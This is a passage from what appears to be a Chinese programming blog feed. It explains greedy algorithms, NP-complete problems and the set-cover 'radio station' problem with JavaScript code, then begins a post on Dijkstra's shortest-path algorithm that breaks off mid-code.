        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>贪心算法（又称贪婪算法）是指，在对问题求解时，总是做出在当前看来是最好的选择。也就是说，不从整体最优上加以考虑，<strong>算法得到的是在某种意义上的局部最优解</strong></p><p>换句话说：贪婪算法就是每步都选择局部最优解，最终得到的就是全局最优解</p></blockquote><p>贪心算法也存在如下问题：</p><ol><li>不能保证解是最佳的。因为贪心算法总是从局部出发，并没从整体考虑</li><li>贪心算法一般用来解决求最大或最小解</li><li>贪心算法只能确定某些问题的可行性范围</li></ol><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="教室调度问题"><a href="#教室调度问题" class="headerlink" title="教室调度问题"></a>教室调度问题</h3><p><img src= "/img/loading.gif" data-src="/2022/02/10/%E8%B4%AA%E5%A9%AA%E7%AE%97%E6%B3%95/image-20220220150319952.png" alt="image-20220220150319952"></p><h3 id="集合覆盖问题（广播站问题）"><a href="#集合覆盖问题（广播站问题）" class="headerlink" title="集合覆盖问题（广播站问题）"></a>集合覆盖问题（广播站问题）</h3><p><img src= "/img/loading.gif" data-src="/2022/02/10/%E8%B4%AA%E5%A9%AA%E7%AE%97%E6%B3%95/image-20220220150857304.png" alt="image-20220220150857304"></p><p>这一节的算法代码会在后面放出来，我们先专注于这个算法以及其应用先，毕竟会用但不知道在哪用就跟不会用差不多嘛</p><p>通过上面两个例子，我们可以得出如简介一样的总结，贪婪算法不算最优解，但是在某些复杂的问题下我们用它可以达到非常接近最优解的解，那什么又是复杂的问题，也就是哪些问题才需要用到贪婪算法呢</p><h2 id="NP完全问题"><a href="#NP完全问题" class="headerlink" title="NP完全问题"></a>NP完全问题</h2><blockquote><p>NP完全问题的简单定义：以难解著称的问题，如旅行商问题和集合覆盖问题。很多非常 聪明的人都认为，根本不可能编写出可快速解决这些问题的算法。</p></blockquote><p>比如<a href="https://baike.baidu.com/item/%E6%97%85%E8%A1%8C%E5%95%86%E9%97%AE%E9%A2%98/7737042" target="_blank" rel="noopener">旅行商问题</a>，这个<a href="https://zhuanlan.zhihu.com/p/159266077" target="_blank" rel="noopener">链接</a>会讲述TSP问题以及帮你引入到贪婪算法里，懂了这一节的例子也可以不用看了</p><p>比如有这么三个城市-北京、石家庄、呼和浩特，你都想去旅游，于是有一天，你开始规划路线，那么从哪里出发，最后去哪里，你会如何规划呢</p><p><img src= "/img/loading.gif" data-src="/2022/02/10/%E8%B4%AA%E5%A9%AA%E7%AE%97%E6%B3%95/image-20220220152241040.png" alt="image-20220220152241040"></p><p>我们先不考虑起点从哪，假设我们想先去石家庄，然后去呼和浩特，最后再到北京，这便是其中一条路线，但我们想找出最短的那条路程，比较把时间花在路上，玩的很累不是吗，那么怎么选呢，<strong>穷举法</strong>？好像很不错的样子，我们来试试</p><blockquote><p>北京-石家庄-呼和浩特</p><p>北京-呼和浩特-石家庄</p><p>石家庄-北京-呼和浩特</p><p>石家庄-呼和浩特-北京</p><p>呼和浩特-北京-石家庄</p><p>呼和浩特-石家庄-北京</p></blockquote><p>然后就是在里面挑出一条最佳路线，显然，这个方法的时间复杂度是<strong>O(n！)</strong></p><p>这可是阶乘啊，意味着啥，当你越来越富，想玩的地方越来越多，你要挑选出一条最佳路线的难度可是越来越大，原来有钱人也不是那么好的</p><p>那么这个时候我们就要选择贪婪算法了</p><h3 id="如何识别-NP-完全问题"><a href="#如何识别-NP-完全问题" class="headerlink" title="如何识别 NP 完全问题"></a>如何识别 NP 完全问题</h3><p>NP完全问题无处不在！如果能够判断出要解决的问题属于NP完全问题就好了，这样就不用去寻找完美的解决方案，而是使用近似算法即可。但要判断问题是不是NP完全问题很难，易于解决的问题和NP完全问题的差别通常很小</p><p>下面几点可作为辨别NP问题的参考</p><ol><li>元素较少时算法的运行速度非常快，但随着元素数量的增加，速度会变得非常慢。</li><li>涉及“所有组合”的问题通常是NP完全问题。</li><li>不能将问题分成小问题，必须考虑各种可能的情况。这可能是NP完全问题。</li><li>如果问题涉及序列（如旅行商问题中的城市序列）且难以解决，它可能就是NP完全问题。</li><li>如果问题涉及集合（如广播台集合）且难以解决，它可能就是NP完全问题。</li><li>如果问题可转换为集合覆盖问题或旅行商问题，那它肯定是NP完全问题。</li></ol><h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><ol><li>有个邮递员负责给20个家庭送信，需要找出经过这20个家庭的最短路径。请问这是一 个NP完全问题吗？</li><li>在一堆人中找出最大的朋友圈（即其中任何两个人都相识）是NP完全问题吗？</li><li>你要制作中国地图，需要用不同的颜色标出相邻的省。为此，你需要确定最少需要使用多少种颜色，才能确保任何两个相邻省的颜色都不同。请问这是NP完全问题吗？</li></ol><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>说完上面，我们来看看JavaScript如何实现广播站问题的贪婪算法</p><p>首先，运行该算法我们需要什么样的数据格式，一个用于存储省名的数组、一个用于表达广播站及其可以广播的省份的映射关系-散列表，在里面，我们用字母来表示广播站</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//省份缩写</span></span><br><span class="line"><span class="keyword">let</span> address = [<span class="string">'GD'</span>, <span class="string">'HN'</span>, <span class="string">'AH'</span>, <span class="string">'ZJ'</span>, <span class="string">'HN'</span>, <span class="string">'HB'</span>, <span class="string">'FJ'</span>, <span class="string">'GC'</span>, <span class="string">'JS'</span>, <span class="string">'SC'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//广播站-散列表</span></span><br><span class="line"><span class="keyword">let</span> radioStation = &#123;</span><br><span class="line">  a: [<span class="string">'GD'</span>, <span class="string">'HN'</span>, <span class="string">'AH'</span>],</span><br><span class="line">  b: [<span class="string">'AH'</span>, <span class="string">'ZJ'</span>, <span class="string">'HN'</span>, <span class="string">'SC'</span>],</span><br><span class="line">  c: [<span class="string">'HN'</span>, <span class="string">'AH'</span>, <span class="string">'ZJ'</span>],</span><br><span class="line">  d: [<span class="string">'FJ'</span>, <span class="string">'GC'</span>, <span class="string">'JS'</span>],</span><br><span class="line">  e: [<span class="string">'HN'</span>, <span class="string">'HB'</span>, <span class="string">'FJ'</span>, <span class="string">'GC'</span>, <span class="string">'JS'</span>],</span><br><span class="line">  f: [<span class="string">'HN'</span>, <span class="string">'HB'</span>, <span class="string">'FJ'</span>, <span class="string">'SC'</span>],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接着就是算法的实现了</p><p>记住我们的步骤</p><p>(1) 选出这样一个广播台，即它覆盖了<strong>最多的未覆盖</strong>省份。即便这个广播台覆盖了一些已覆盖的省，也没有关系。</p><p> (2) 重复第一步，直到覆盖了所有的州。</p><p>根据第二步，我们就应该会感觉到可能要用到迭代了</p><p>首先先不管用不用迭代，我们来分析下这个过程</p><p>最核心的一步：我们要找出<strong>最多的未覆盖</strong>省份的广播站，那么这一步如何实现</p><p>通过<strong>遍历</strong>广播站，找出广播站和所需要覆盖的省份间的<strong>交集</strong>，谁的交集包含的元素<strong>最多</strong>，就选哪个，这就是最核心的了，遍历、交集、最多，这三个名称就是算法核心代码了，如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 最大地址数的广播站所能广播的地址</span></span><br><span class="line"><span class="keyword">let</span> maxAddressStation = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line"><span class="comment">// 最大地址数的广播站名称</span></span><br><span class="line"><span class="keyword">let</span> station = <span class="built_in">Object</span>.keys(radioStation)[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 遍历radioStation，将每一项与addressCollection进行交集</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> radioStation) &#123;</span><br><span class="line">  <span class="keyword">const</span> element = radioStation[key];</span><br><span class="line">  <span class="keyword">let</span> intersection = <span class="keyword">new</span> <span class="built_in">Set</span>(address.filter(<span class="function"><span class="params">i</span> =&gt;</span> <span class="keyword">new</span> <span class="built_in">Set</span>(element).has(i))); <span class="comment">//取交集</span></span><br><span class="line">  <span class="comment">// 判断：若当前集合大于之前的集合，则重新赋值最大值</span></span><br><span class="line">  intersection.size &gt; maxAddressStation.size &amp;&amp; ((maxAddressStation = intersection), (station = key));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着遍历完第一遍，有可能会剩下其他省份还没找出广播站呢，那该如何做呢，再对剩下的省份执行上述步骤嘛，这不就要用到迭代了，代码如下，我们用<code>res</code>这个变量用于存储最终的广播站结果集合，然后记得把当前选到的广播站从下次执行的函数参数中的数据删除</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">res.push(station); <span class="comment">//将广播站压入</span></span><br><span class="line">address = address.filter(<span class="function"><span class="params">i</span> =&gt;</span> !maxAddressStation.has(i)); <span class="comment">//取差集，即剩下需要广播的地址</span></span><br><span class="line"><span class="keyword">delete</span> radioStation[station]; <span class="comment">//排除当前已选择的广播站</span></span><br><span class="line"><span class="keyword">return</span> greedy(address, radioStation, res); <span class="comment">//继续下次递归</span></span><br></pre></td></tr></table></figure><p>既然是迭代，那肯定要有终止条件，不然就无限迭代下去了，这个问题的基线条件是所有的地址都已找到所能广播的广播站了，换成代码的解释就是address长度为零</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 基线条件（递归终止条件）</span></span><br><span class="line"><span class="keyword">if</span> (address.length == <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好了，这就是这个算法的大致代码了，等等，如果有一个地址没有任何广播站能广播到呢，出现这种情况怎么办，这种问题我们只能当作无解，毕竟没有广播站能广播到你要的地址，说明数据有问题，需求也就根本无法解决</p><p>代码上也就是，两者交集没有任何结果，如果address长度还没为0时，没有结果意味着没有广播站可以服务该地址了，所以注意该代码位置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (maxAddressStation.size == <span class="number">0</span>) <span class="keyword">return</span> <span class="string">'所选数据无解'</span>;</span><br></pre></td></tr></table></figure><p>全部代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 贪婪算法： 参数：所有地点（数组）、广播站（散列表）、最终结果</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">greedy</span>(<span class="params">address, radioStation, res = []</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 最大地址数的广播站所能广播的地址</span></span><br><span class="line">  <span class="keyword">let</span> maxAddressStation = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">  <span class="comment">// 最大地址数的广播站名称</span></span><br><span class="line">  <span class="keyword">let</span> station = <span class="built_in">Object</span>.keys(radioStation)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 基线条件（递归终止条件）</span></span><br><span class="line">  <span class="keyword">if</span> (address.length == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 遍历radioStation，将每一项与addressCollection进行交集</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> radioStation) &#123;</span><br><span class="line">    <span class="keyword">const</span> element = radioStation[key];</span><br><span class="line">    <span class="keyword">let</span> intersection = <span class="keyword">new</span> <span class="built_in">Set</span>(address.filter(<span class="function"><span class="params">i</span> =&gt;</span> <span class="keyword">new</span> <span class="built_in">Set</span>(element).has(i))); <span class="comment">//取交集</span></span><br><span class="line">    <span class="comment">// 判断：若当前集合大于之前的集合，则重新赋值最大值</span></span><br><span class="line">    intersection.size &gt; maxAddressStation.size &amp;&amp; ((maxAddressStation = intersection), (station = key));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (maxAddressStation.size == <span class="number">0</span>) <span class="keyword">return</span> <span class="string">'所选数据无解'</span>;</span><br><span class="line"></span><br><span class="line">  res.push(station); <span class="comment">//将广播站压入</span></span><br><span class="line">  address = address.filter(<span class="function"><span class="params">i</span> =&gt;</span> !maxAddressStation.has(i)); <span class="comment">//取差集，即剩下需要广播的地址</span></span><br><span class="line">  <span class="keyword">delete</span> radioStation[station]; <span class="comment">//排除当前已选择的广播站</span></span><br><span class="line">  <span class="keyword">return</span> greedy(address, radioStation, res); <span class="comment">//继续下次递归</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ol><li>贪婪算法寻找局部最优解，企图以这种方式获得全局最优解。 </li><li>对于NP完全问题，还没有找到快速解决方案。 </li><li>面临NP完全问题时，最佳的做法是使用近似算法。 </li><li>贪婪算法易于实现、运行速度快，是不错的近似算法。</li></ol><h3 id="练习答案"><a href="#练习答案" class="headerlink" title="练习答案"></a>练习答案</h3><p>三个都是NP问题，快去用贪婪算法试着解出来吧！加油💪</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>狄克斯特拉算法</title>
      <link href="/2021/10/06/%E7%8B%84%E5%85%8B%E6%96%AF%E7%89%B9%E6%8B%89%E7%AE%97%E6%B3%95/"/>
      <url>/2021/10/06/%E7%8B%84%E5%85%8B%E6%96%AF%E7%89%B9%E6%8B%89%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><blockquote><p>迪杰斯特拉算法主要特点是从起始点开始，采用<a href="https://baike.baidu.com/item/贪心算法/5411800" target="_blank" rel="noopener">贪心算法</a>的策略，每次遍历到始点距离最近且未访问过的顶点的邻接节点，直到扩展到终点为止</p></blockquote><h2 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h2><p>假设给定一个二维数组，里面存储着各个相邻点之间的距离，</p><p>比如第一个<code>[&#39;a&#39;, &#39;b&#39;, 20]</code>，表示着从A点到B点的距离为20，以此类推</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> data = [</span><br><span class="line">  [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="number">20</span>],</span><br><span class="line">  [<span class="string">'a'</span>, <span class="string">'e'</span>, <span class="number">20</span>],</span><br><span class="line">  [<span class="string">'a'</span>, <span class="string">'c'</span>, <span class="number">3</span>],</span><br><span class="line">  [<span class="string">'b'</span>, <span class="string">'c'</span>, <span class="number">20</span>],</span><br><span class="line">  [<span class="string">'c'</span>, <span class="string">'d'</span>, <span class="number">5</span>],</span><br><span class="line">  [<span class="string">'c'</span>, <span class="string">'e'</span>, <span class="number">30</span>],</span><br><span class="line">  [<span class="string">'d'</span>, <span class="string">'e'</span>, <span class="number">6</span>],</span><br><span class="line">  [<span class="string">'e'</span>, <span class="string">'a'</span>, <span class="number">20</span>],</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>而我们的需求则是，以某个确定的点为起点，得出其到其余点的最短距离，比如以a为起点，我们想得到其到b、c、d、e的最短距离</p><p>那么这个算法该如何在js上实现</p><p>单纯从这个数组来看，好像有点想不出解法，我们先试着把它转化成图形关系，从而更加容易理解点</p><p><img src= "/img/loading.gif" data-src="/2021/10/06/%E7%8B%84%E5%85%8B%E6%96%AF%E7%89%B9%E6%8B%89%E7%AE%97%E6%B3%95/image-20220218093850197.png" alt="image-20220218093850197"></p><p>从这个图，我们可以更加直观的理解每个点之间的位置距离关系，比如A，可以直接到达B、C、E，但却不能直接到达D，要想过去，还得通过一些“中介点”</p><p>接着，我们来简略介绍下狄克斯特拉算法的使用步骤</p><blockquote><p>(1) 找出“最便宜”的节点，即可在最短时间内到达的节点。 </p><p>(2) 更新该节点的邻居的开销。</p><p>(3) 重复这个过程，直到对图中的每个节点都这样做了。</p><p> (4) 计算最终路径。</p></blockquote><p>在默认初始化条件下：我们用一个表来记录默认起点下到其他点的最短距离</p><table><thead><tr><th>次数</th><th>S</th><th>b</th><th>c</th><th>d</th><th>e</th></tr></thead><tbody><tr><td>1</td><td>{a}</td><td>20</td><td>3</td><td>∞</td><td>20</td></tr><tr><td>2</td><td>{a,c}</td><td>20</td><td>3</td><td>8</td><td>20</td></tr><tr><td>3</td><td>{a,c,b}</td><td>20</td><td>3</td><td>8</td><td>20</td></tr><tr><td>4</td><td>{a,c,b,d}</td><td>20</td><td>3</td><td>8</td><td>14</td></tr></tbody></table><p>用一个表格记录更新完最短距离表格后的目标地点的上一个节点</p><table><thead><tr><th>次数</th><th>b</th><th>c</th><th>d</th><th>e</th></tr></thead><tbody><tr><td>1</td><td>a</td><td>a</td><td>a</td><td>a</td></tr><tr><td>2</td><td>a</td><td>a</td><td>c</td><td>a</td></tr><tr><td>3</td><td>a</td><td>a</td><td>c</td><td>a</td></tr><tr><td>4</td><td>a</td><td>a</td><td>c</td><td>d</td></tr></tbody></table><p>阐述下这个过程</p><p>首先，我们将A到各个其他点的距离记录进去，接着按<strong>初始距离从短到长</strong>的顺序将a,b、a,c、a,d这三个当作一个整体去更新表格(注意：这里不是简单的就是a→b，而是他们之间的最短路径)</p><p>记住，每次我们都从最短的路径入手，比如a到c的距离最短，那么我们就从该点c入手，其次就是在b和d中选择</p><p>比如在接下来，我们把a→c当作一个整体，它的默认权重为3，然后去对比其他各个点，注意看图，根据结果去刷新最短距离，比如c到e的距离是30，加上默认权重（a→c）3，是33，比a直接到达e还远，所以我们不更新该距离，以及c的最短距离的上一个节点还是a，其他类似，每一步更新完，即可得出起点到达该点的最短距离了</p><p>我们重点看下第三次和第四次，在第三次，a到b，c还是不变，但是c可以直接到d了,也就是说，在原先的基础a到c的距离3上加5，得出该距离为8，同时途径点可以更新为c</p><p>第四次，我们发现d到e的距离为6，加上a到d的最短距离8可以达到14，比a直接过去还短，所以我们更新表格，最短距离为14，上个节点为e</p><p>我们可以看到这样的规律，如果当前节点pass到终点end的距离(passEnd)加上起点start到当前节点pass的距离(startPass)小于默认起点start到终点end的距离(startEnd)，那么就更新表格</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果startPass + passEnd &lt; startEnd</span><br><span class="line">则startEnd = startPass + passEnd（更新）</span><br></pre></td></tr></table></figure><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><ol><li>我们用一个对象来存储当个点到其他点的距离，比如下面</li></ol><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  b: &#123;</span><br><span class="line">    instance: 20,</span><br><span class="line">    process: a</span><br><span class="line">  &#125;,</span><br><span class="line">  c: &#123;</span><br><span class="line">    instance: 3,</span><br><span class="line">    process: a</span><br><span class="line">  &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用一个函数来格式化该操作，data为数组数据，startPoint为起点，targetPoint为终点集合（数组），格式完数据后，我们把起点到起点的数据删掉，因为该点并没有什么用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化单个数据的散列表</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params">data, startPoint, targetPoint</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> res = &#123;&#125;</span><br><span class="line">    <span class="comment">// 初始化每条数据，默认距离为无穷大，上一节点为起始点startPoint</span></span><br><span class="line">  targetPoint.forEach(<span class="function"><span class="params">i</span> =&gt;</span> &#123;</span><br><span class="line">      res[i] = &#123;</span><br><span class="line">        instance: <span class="number">99999</span>,</span><br><span class="line">        process: startPoint,</span><br><span class="line">        target: i</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">// 遍历数据，赋值已有最近临点初始距离</span></span><br><span class="line">  data.forEach(<span class="function"><span class="params">i</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (res[i[<span class="number">1</span>]] &amp;&amp; i[<span class="number">0</span>] == startPoint) &#123;</span><br><span class="line">      res[i[<span class="number">1</span>]].instance = i[<span class="number">2</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  res[startPoint] &amp;&amp; <span class="keyword">delete</span> res[startPoint] <span class="comment">//删除起点（无用）</span></span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>接着，我们用另一个对象把所有数据包裹起来，</li></ol><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   起点1:&#123;</span><br><span class="line">     目标地点1:&#123;</span><br><span class="line">       instance: 距离,</span><br><span class="line">       process: [途径地点]</span><br><span class="line">     &#125;,</span><br><span class="line">     目标地点2: &#123;</span><br><span class="line">       instance: 距离,</span><br><span class="line">       process: [途径地点]</span><br><span class="line">     &#125;</span><br><span class="line">...</span><br><span class="line">   &#125;,</span><br><span class="line">   起点2:&#123;</span><br><span class="line">     目标地点1:&#123;</span><br><span class="line">       instance: 距离,</span><br><span class="line">       process: [途径地点]</span><br><span class="line">     &#125;,</span><br><span class="line">     目标地点2:&#123;</span><br><span class="line">       instance: 距离,</span><br><span class="line">       process: [途径地点]</span><br><span class="line">     &#125;...</span><br><span class="line">   &#125; </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>实现该操作的函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 建立全部数据的散列表</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pointDistanceHashTable</span>(<span class="params">data, targetPoint</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> res = &#123;&#125;</span><br><span class="line">    <span class="comment">// 对所有点进行遍历并初始化</span></span><br><span class="line">  targetPoint.forEach(<span class="function">(<span class="params">i, index</span>) =&gt;</span> &#123;</span><br><span class="line">    res[i] = init(data, i, targetPoint)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>对比长度的函数，通过前面的介绍我们可以知道这个过程的实现，无需多言，直接看代码，入参含义为（数组数据，起点名称，当前点名称，终点名称）</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对比两者距离长度，会改变data，返回最新结果</span></span><br><span class="line"><span class="comment">// 参数：数据initData, 起点名称，当前点名称，终点名称</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">longer</span>(<span class="params">initData, start, pass, end</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> newDistance = initData[start][pass].instance + initData[pass][end].instance</span><br><span class="line">  <span class="keyword">if</span> (newDistance &lt; initData[start][end].instance) &#123;</span><br><span class="line">    initData[start][end].instance = newDistance</span><br><span class="line">    initData[start][end].process = pass</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> initData[start]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>按距离从小到大进行排序，传入对象（数组），返回数组，会改变原数据</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sortData</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!(data <span class="keyword">instanceof</span> <span class="built_in">Array</span>)) &#123;</span><br><span class="line">    <span class="keyword">let</span> arr = []</span><br><span class="line">    <span class="keyword">for</span> (key <span class="keyword">in</span> data) &#123;</span><br><span class="line">      arr.push(data[key])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> a.instance - b.instance</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> data.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a.instance - b.instance</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>主函数入口：最主要的就是迭代，对每个点进行迭代执行analyse函数，再对每个点下的终点距离进行遍历判断</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dijkstra</span>(<span class="params">data, startPoint, targetPoint</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> allPoint = <span class="keyword">new</span> <span class="built_in">Set</span>([...targetPoint, startPoint])</span><br><span class="line">    <span class="comment">// 获取全部点的散列表</span></span><br><span class="line">  <span class="keyword">let</span> initData = pointDistanceHashTable(data, allPoint);</span><br><span class="line">  <span class="comment">// 将起点单独提取出来，用于遍历, 大小比较</span></span><br><span class="line">  <span class="keyword">let</span> startPointData = initData[startPoint];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 按初始路径长短顺序进行路径分析</span></span><br><span class="line">  <span class="keyword">return</span> (analyse = <span class="function"><span class="keyword">function</span>(<span 